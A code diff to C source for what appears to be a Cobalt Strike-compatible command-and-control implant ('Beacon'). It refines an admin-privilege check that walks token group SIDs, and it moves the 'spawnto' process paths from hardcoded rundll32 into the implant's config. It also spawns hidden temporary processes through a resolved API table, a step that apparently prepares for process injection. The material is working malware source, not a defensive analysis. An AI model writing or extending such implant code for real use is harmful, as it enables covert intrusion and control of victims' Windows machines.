@@ -483,7 +483,7 @@ BOOL BeaconIsAdmin(void) {
     }
 
     /*
-     * Fallback: TokenGroups – iterate group SIDs and check for
+     * Fallback: TokenGroups -> iterate group SIDs and check for
      * S-1-5-32-544 (BUILTIN\Administrators).
      *
      * SID structure:
@@ -515,7 +515,7 @@ BOOL BeaconIsAdmin(void) {
     for (DWORD i = 0; i < pGroups->GroupCount; i++) {
         SID_AND_ATTRIBUTES* sa = &pGroups->Groups[i];
 
-        /* Skip disabled or deny-only groups – we want enabled/admin groups */
+        /* Skip disabled or deny-only groups, we want enabled/admin groups */
         if (!(sa->Attributes & SE_GROUP_ENABLED)) {
             continue;
         }
@@ -559,7 +559,7 @@ BOOL BeaconIsAdmin(void) {
 }
 
 
-void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
+void BeaconGetSpawnTo(bool x86, char* buffer, int length) {
     const char* tempBufferPath = NULL;
 
     if (buffer == NULL || length <= 0) {
@@ -573,6 +573,11 @@ void BeaconGetSpawnTo(BOOL x86, char* buffer, int length) {
         } else if (!x86 && g_beaconConfig->spawnto_x64_len > 0) {
             tempBufferPath = g_beaconConfig->spawnto_x64;
         }
+    }
+
+    // Fallback: cannot proceed without config (should never happen)
+    if (tempBufferPath == NULL) {
+        return;
     }
 
     SIZE_T pathLen = __strlen(tempBufferPath);
@@ -744,21 +749,28 @@ char* BeaconGetOutputData(int *outsize) {
 }
 
 /* Spawn+Inject Functions - Stubs for CS BOF compatibility */
-void BeaconGetSpawnTo(bool x86, char * buffer, int length) {
-    if (!buffer || length <= 0) return;
-    const char* path = x86 ? "C:\\Windows\\SysWOW64\\rundll32.exe" : "C:\\Windows\\System32\\rundll32.exe";
-    if (length > 1) {
-        __strncpy(buffer, path, length - 1);
-        buffer[length - 1] = '\0';
-    }
-}
 
 BOOL BeaconSpawnTemporaryProcess(bool x86, bool ignoreToken, STARTUPINFOW * sInfo, PROCESS_INFORMATION * pInfo) {
     if (!sInfo || !pInfo || !g_functionTable) return FALSE;
     
-    const char* cmd = x86 ? "C:\\Windows\\SysWOW64\\rundll32.exe" : "C:\\Windows\\System32\\rundll32.exe";
+    const char* spawntoPath = NULL;
+
+    // Use config if available
+    if (g_beaconConfig != NULL) {
+        if (x86 && g_beaconConfig->spawnto_x86_len > 0) {
+            spawntoPath = g_beaconConfig->spawnto_x86;
+        } else if (!x86 && g_beaconConfig->spawnto_x64_len > 0) {
+            spawntoPath = g_beaconConfig->spawnto_x64;
+        }
+    }
+
+    // Fallback: cannot proceed without config (should never happen)
+    if (spawntoPath == NULL) {
+        return FALSE;
+    }
+
     wchar_t wcmd[MAX_PATH];
-    if (__mbstowcs(wcmd, cmd, MAX_PATH) == (size_t)-1) return FALSE;
+    if (__mbstowcs(wcmd, spawntoPath, MAX_PATH) == (size_t)-1) return FALSE;
     
     __memset(sInfo, 0, sizeof(STARTUPINFOW));
     sInfo->cb = sizeof(STARTUPINFOW);
@@ -773,7 +785,7 @@ BOOL BeaconSpawnTemporaryProcess(bool x86, bool ignoreToken, STARTUPINFOW * sInf
     
     BOOL success = FALSE;
     if (g_functionTable->CreateProcessW) {
-        success = g_functionTable->CreateProcessW(wcmd, NULL, NULL, NULL, ignoreToken ? FALSE : TRUE, 
+        success = g_functionTable->CreateProcessW(wcmd, NULL, NULL, NULL, ignoreToken ? FALSE : TRUE,
                                   CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     }
     
